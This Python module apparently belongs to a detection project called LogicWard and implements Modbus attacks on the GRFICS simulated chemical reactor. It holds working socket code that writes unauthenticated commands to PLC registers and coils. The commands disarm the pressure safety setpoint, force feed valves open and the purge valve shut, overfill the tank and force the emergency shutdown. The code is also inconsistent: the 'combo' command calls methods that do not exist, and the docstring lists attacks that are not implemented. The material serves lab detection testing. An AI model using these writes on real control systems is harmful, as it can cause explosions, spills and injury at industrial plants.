"""Attacks on the GRFICS chemical reactor - real unauthenticated Modbus writes.

Every attack is an FC05/FC06 write to the chemical PLC's holding registers /
coils (the same insecure Modbus the thermal plant exposes). Each one has a
VISIBLE consequence on the Unity 3D scene AND trips LogicWard's chemical drift
detector:

  defeat-protection : raise the pressure safety setpoint  -> protection disarmed
  valve-override    : feeds 100%, purge shut              -> pressure redlines
  overfill          : product shut, feeds high            -> tank overflows
  estop-injection   : force the emergency shutdown coil   -> plant slams down
  pump-kill         : force a feed pump off               -> feed disturbance

Usage:
    python -m logicward.sites.grfics.attacks --host H --port P <command>
"""
from __future__ import annotations

import socket
import struct
import sys
import time

from logicward.sites.grfics import points as pts


class ChemAttacker:
    def __init__(self, host: str = "127.0.0.1", port: int = 5021, unit: int = 1):
        self.host = host
        self.port = port
        self.unit = unit

    def _modbus(self, pdu: bytes) -> bytes | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((self.host, self.port))
            s.sendall(struct.pack(">HHHB", 1, 0, len(pdu) + 1, self.unit) + pdu)
            data = s.recv(512)
            s.close()
            return data
        except OSError:
            return None

    def write_register(self, tag: str, eng_value: float) -> bool:
        p = pts.BY_TAG[tag]
        raw = max(0, min(65535, pts.raw(eng_value, tag)))
        return self._modbus(struct.pack(">BHH", 0x06, p.address, raw)) is not None

    def write_coil(self, tag: str, on: bool) -> bool:
        p = pts.BY_TAG[tag]
        return self._modbus(struct.pack(">BHH", 0x05, p.address, 0xFF00 if on else 0x0000)) is not None

    # -- named attacks --
    def pressure_redline(self) -> dict:
        self.write_register("Pressure_HH_SP", 4100.0)      # above the ceiling -> never trips
        a = self.write_register("Feed1_Valve_Cmd", 100.0)
        b = self.write_register("Feed2_Valve_Cmd", 100.0)
        c = self.write_register("Purge_Valve_Cmd", 0.0)
        return {"attack": "pressure-redline", "ok": a and b and c,
                "note": "Safety setpoint defeated AND valves forced open - pressure redlines"}

    def overfill(self) -> dict:
        a = self.write_register("Product_Valve_Cmd", 0.0)
        b = self.write_register("Feed1_Valve_Cmd", 90.0)
        c = self.write_register("Feed2_Valve_Cmd", 90.0)
        return {"attack": "overfill", "ok": a and b and c,
                "note": "Product valve shut, feeds high - liquid level overflows"}

    def estop_injection(self) -> dict:
        ok = self.write_coil("Reactor_ESD", True)
        self.write_register("Feed1_Valve_Cmd", 0.0)
        self.write_register("Feed2_Valve_Cmd", 0.0)
        self.write_register("Purge_Valve_Cmd", 100.0)
        return {"attack": "estop-injection", "ok": ok,
                "note": "Emergency shutdown coil forced - plant slams to safe-state (valves drop to 0)"}


ATTACKS = {
    "pressure-redline": "pressure_redline",
    "overfill": "overfill",
    "estop-injection": "estop_injection",
}


def main() -> None:
    import argparse
    ap = argparse.ArgumentParser(description="GRFICS chemical reactor attacks (Modbus)")
    ap.add_argument("command", choices=[*ATTACKS, "combo"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5021)
    args = ap.parse_args()
    atk = ChemAttacker(args.host, args.port)

    if args.command == "combo":
        # the headline scenario: disarm protection, then drive pressure past the
        # (now-defeated) safe limit so the 3D redlines without an auto-trip.
        for step in (atk.defeat_protection, atk.valve_override):
            print(step())
            time.sleep(1.0)
        return
    print(getattr(atk, ATTACKS[args.command])())


if __name__ == "__main__":
    main()
